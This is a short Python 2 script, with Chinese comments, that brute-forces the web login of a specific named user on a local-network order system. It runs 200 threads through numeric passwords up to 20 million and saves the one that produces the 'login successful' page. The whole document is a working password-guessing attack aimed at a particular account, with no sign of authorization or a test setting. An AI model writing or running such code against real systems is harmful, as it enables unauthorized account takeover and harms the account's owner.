#coding:utf-8
#!/usr/bin/env python

__author__ = 'SAF'
#首先知道他的密码是8位的数字 这就好办了

import urllib, urllib2, cookielib
import threading


cookie_support = urllib2.HTTPCookieProcessor(cookielib.CookieJar())
opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)
urllib2.install_opener(opener)
url = ''

class PrintNumber(threading.Thread):
    def __init__(self, n, m):
        self.n = n
        self.m = m
        super(PrintNumber, self).__init__()

    def run(self):
        for i in range(self.n, self.n + self.m):
            params = urllib.urlencode({'userName': 'zjm1126', 'userPwd': str(i)})
            content = urllib2.urlopen('http://192.168.1.200/order/index.php?op=Login&ac=login&', params).read()

            if content.find('登录成功') > 0:
                file1 = open('password.txt', 'w')
                file1.write(str(i))
                return
            print i


def run(m, n):
    s = m / n
    a = [i * s for i in range(n)]
    for i in a:
        thread = PrintNumber(i, s)
        thread.start()


m = 20000000  #范围
n = 200  #几个线程